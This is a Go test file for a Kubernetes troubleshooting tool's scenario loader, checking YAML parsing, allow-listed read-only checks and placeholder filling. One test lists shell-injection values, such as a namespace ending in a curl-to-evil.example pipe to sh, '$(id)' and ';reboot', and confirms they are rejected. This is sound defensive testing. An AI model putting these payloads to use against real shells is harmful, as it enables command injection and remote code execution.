package scenarios

import (
	"errors"
	"strings"
	"testing"
	"testing/fstest"

	"kubemap/pkg/protocol"
)

// Every embedded scenario must load: a bad file fails "make all" here.
func TestEmbeddedScenarios(t *testing.T) {
	all, err := Load()
	if err != nil {
		t.Fatal(err)
	}
	var s *Scenario
	for i := range all {
		if all[i].ID == "traffic-503" {
			s = &all[i]
		}
	}
	if s == nil {
		t.Fatal("traffic-503 is missing")
	}
	if len(s.Steps) < 5 || len(s.Causes) == 0 || len(s.Senior) == 0 || s.Lab == "" {
		t.Fatalf("traffic-503 is thin: %d steps, %d causes", len(s.Steps), len(s.Causes))
	}
	if got := strings.Join(s.Params, ","); got != "ns,svc,pod,fromns,from,port,node" {
		t.Fatalf("params %s", got)
	}
	checks := 0
	for _, st := range s.Steps {
		if st.Check != nil {
			checks++
		}
	}
	if checks < 4 {
		t.Fatalf("only %d live checks", checks)
	}
}

const good = `
id: sample
area: pods
title: "T"
question: "Q?"
steps:
  - title: "S"
    why: "W"
    command: "kubectl -n <ns> get pods"
    check: {op: "service.check", args: {namespace: "$ns"}}
`

func TestParseRejects(t *testing.T) {
	if _, err := Parse([]byte(good)); err != nil {
		t.Fatalf("good file refused: %v", err)
	}
	cases := map[string]struct{ from, to, want string }{
		"unknown field":       {`question: "Q?"`, "question: \"Q?\"\nowner: me", `unknown field "owner"`},
		"unknown step field":  {`why: "W"`, "why: \"W\"\n    risk: high", `unknown field "risk"`},
		"missing why":         {`why: "W"`, `why: ""`, "why is required"},
		"missing command":     {`command: "kubectl -n <ns> get pods"`, `command: ""`, "command is required"},
		"op not allowed":      {`op: "service.check"`, `op: "tokenreview"`, "not on the read-only allow list"},
		"list not allowed":    {`op: "service.check"`, `op: "list"`, "not on the read-only allow list"},
		"unknown argument":    {`args: {namespace: "$ns"}`, `args: {namespace: "$ns", verb: "delete"}`, `has no argument "verb"`},
		"missing argument":    {`op: "service.check", args: {namespace: "$ns"}`, `op: "pod.debug", args: {namespace: "$ns"}`, `needs argument "pod"`},
		"unknown placeholder": {`args: {namespace: "$ns"}`, `args: {namespace: "$nsp"}`, `unknown placeholder "nsp"`},
		"placeholder in cmd":  {"get pods\"", "get <thing>\"", `unknown placeholder "thing"`},
		"odd literal":         {`args: {namespace: "$ns"}`, `args: {namespace: "a b"}`, "must be a placeholder"},
		"bad area":            {"area: pods", "area: fun", "area \"fun\""},
		"bad id":              {"id: sample", "id: Sample_1", "lowercase words"},
		"bad page":            {`why: "W"`, "why: \"W\"\n    kubemap: \"dashboard\"", "kubemap \"dashboard\""},
		"params set by hand":  {`question: "Q?"`, "question: \"Q?\"\nparams: [ns]", "params is computed"},
		"not yaml":            {"steps:", "steps: [", "not valid YAML"},
		"missing title":       {`title: "T"`, `title: ""`, "title is required"},
		"netpol two targets":  {`op: "service.check", args: {namespace: "$ns"}`, `op: "netpol.check", args: {fromNamespace: "$ns", fromPod: "$pod", toNamespace: "$ns", toService: "$svc", toPod: "$pod", port: "80"}`, "exactly one of toService and toPod"},
	}
	for name, c := range cases {
		t.Run(name, func(t *testing.T) {
			src := strings.Replace(good, c.from, c.to, 1)
			if src == good {
				t.Fatalf("test case did not change the file (%q not found)", c.from)
			}
			_, err := Parse([]byte(src))
			if err == nil || !strings.Contains(err.Error(), c.want) {
				t.Fatalf("got %v, want %q", err, c.want)
			}
		})
	}
}

// Params come out in the same order every time (not Go's map order).
func TestParamsOrderIsStable(t *testing.T) {
	for i := 0; i < 50; i++ {
		all, err := Load()
		if err != nil {
			t.Fatal(err)
		}
		for _, s := range all {
			if s.ID == "traffic-503" && strings.Join(s.Params, ",") != "ns,svc,pod,fromns,from,port,node" {
				t.Fatalf("run %d: params %v", i, s.Params)
			}
		}
	}
}

func TestParseNeedsSteps(t *testing.T) {
	src := good[:strings.Index(good, "steps:")] + "steps: []\n"
	if _, err := Parse([]byte(src)); err == nil || !strings.Contains(err.Error(), "at least one step") {
		t.Fatalf("no steps: %v", err)
	}
}

func TestLoadChecksFileNamesAndDuplicates(t *testing.T) {
	fs := fstest.MapFS{"pods/sample.yaml": {Data: []byte(good)}}
	if _, err := load(fs); err != nil {
		t.Fatal(err)
	}
	for name, fsys := range map[string]fstest.MapFS{
		"id vs file name": {"pods/other.yaml": {Data: []byte(good)}},
		"area vs folder":  {"nodes/sample.yaml": {Data: []byte(good)}},
		"duplicate id":    {"pods/sample.yaml": {Data: []byte(good)}, "traffic/sample.yaml": {Data: []byte(strings.Replace(good, "area: pods", "area: traffic", 1))}},
	} {
		if _, err := load(fsys); err == nil {
			t.Errorf("%s: accepted", name)
		}
	}
}

func TestRequest(t *testing.T) {
	c := &Check{Op: "service.check", Args: map[string]string{"namespace": "$ns", "service": "$svc"}}
	_, err := c.Request(map[string]string{"ns": "sre-lab-app"})
	var miss *ErrMissing
	if !errors.As(err, &miss) || strings.Join(miss.Names, ",") != "svc" {
		t.Fatalf("missing svc: %v", err)
	}
	req, err := c.Request(map[string]string{"ns": "sre-lab-app", "svc": "flask-vue-backend"})
	if err != nil || req.Op != protocol.OpServiceCheck || req.Namespace != "sre-lab-app" || req.Name != "flask-vue-backend" {
		t.Fatalf("service.check: %+v %v", req, err)
	}
	np := &Check{Op: "netpol.check", Args: map[string]string{"fromNamespace": "$fromns", "fromPod": "$from", "toNamespace": "$ns", "toService": "$svc", "port": "$port"}}
	req, err = np.Request(map[string]string{"fromns": "kube-system", "from": "traefik-1", "ns": "a", "svc": "b", "port": "80"})
	if err != nil || req.NetpolCheck.Port != 80 || req.NetpolCheck.From.Pod != "traefik-1" || req.NetpolCheck.To.Service != "b" {
		t.Fatalf("netpol: %+v %v", req, err)
	}
	if _, err := np.Request(map[string]string{"fromns": "kube-system", "from": "t", "ns": "a", "svc": "b", "port": "http"}); err == nil {
		t.Fatal("a port name was accepted")
	}
	// Values from the browser still go through the protocol's validation.
	if _, err := c.Request(map[string]string{"ns": "a/b", "svc": "x"}); err == nil {
		t.Fatal("a namespace with / was accepted")
	}
	am, _ := (&Check{Op: "appmap", Args: map[string]string{"namespace": "$ns", "app": "$app"}}).Request(map[string]string{"ns": "a", "app": "argocd/flask-vue"})
	if am.AppMap == nil || am.AppMap.App != "argocd/flask-vue" {
		t.Fatalf("appmap: %+v", am)
	}
	if req, _ := (&Check{Op: "node.pressure"}).Request(nil); req.Op != protocol.OpNodePressure {
		t.Fatalf("node.pressure: %+v", req)
	}
	if req, err := (&Check{Op: "health.check", Args: map[string]string{"namespace": "$ns"}}).Request(map[string]string{"ns": "shop"}); err != nil || req.Op != protocol.OpHealthCheck || req.Namespace != "shop" {
		t.Fatalf("health.check: %+v %v", req, err)
	}
}

func TestFill(t *testing.T) {
	got := Fill("kubectl -n <ns> get endpointslices -l kubernetes.io/service-name=<svc>", map[string]string{"ns": "shop"})
	if got != "kubectl -n shop get endpointslices -l kubernetes.io/service-name=<svc>" {
		t.Fatal(got)
	}
}

// Review KM-82 B1: a value becomes part of a command a person pastes into a
// shell, so only plain names and numbers of the right kind are filled in.
func TestValuesAreNeverShellSyntax(t *testing.T) {
	cmd := "kubectl -n <ns> get endpointslices -l kubernetes.io/service-name=<svc>"
	for _, bad := range []string{
		"default;curl https://evil.example/x|sh #", "a|b", "$(id)", "`id`", "a b", "a\nb", "a&&b",
		"A", "-a", "a/b", "../x", "'a'", "\"a\"", "a>b", strings.Repeat("a", 254),
	} {
		if got := Fill(cmd, map[string]string{"ns": bad, "svc": "api"}); !strings.Contains(got, "-n <ns> ") {
			t.Errorf("%q was filled in: %s", bad, got)
		}
		if ValidValue("ns", bad) == nil {
			t.Errorf("%q accepted as a namespace", bad)
		}
	}
	if got := Fill(cmd, map[string]string{"ns": "sre-lab-app", "svc": "flask-vue-backend"}); got != "kubectl -n sre-lab-app get endpointslices -l kubernetes.io/service-name=flask-vue-backend" {
		t.Fatalf("valid values: %s", got)
	}
	for name, cases := range map[string]struct{ ok, bad []string }{
		"port": {ok: []string{"80", "65535", "1"}, bad: []string{"0", "65536", "080", "80;id", "http"}},
		"app":  {ok: []string{"argocd/flask-vue", "sre-lab-app/redis"}, bad: []string{"flask-vue", "a/b/c", "a/$(id)", "a /b"}},
		"node": {ok: []string{"k8server", "ip-10-0-0-1.ec2.internal"}, bad: []string{"k8server;reboot"}},
	} {
		for _, v := range cases.ok {
			if err := ValidValue(name, v); err != nil {
				t.Errorf("%s %q refused: %v", name, v, err)
			}
		}
		for _, v := range cases.bad {
			if ValidValue(name, v) == nil {
				t.Errorf("%s %q accepted", name, v)
			}
		}
	}
	if ValidValue("secret", "x") == nil {
		t.Error("an unknown placeholder was accepted")
	}
	// Check requests refuse them as well.
	c := &Check{Op: "service.check", Args: map[string]string{"namespace": "$ns", "service": "$svc"}}
	if _, err := c.Request(map[string]string{"ns": "a;b", "svc": "x"}); err == nil {
		t.Error("a bad value reached a request")
	}
}
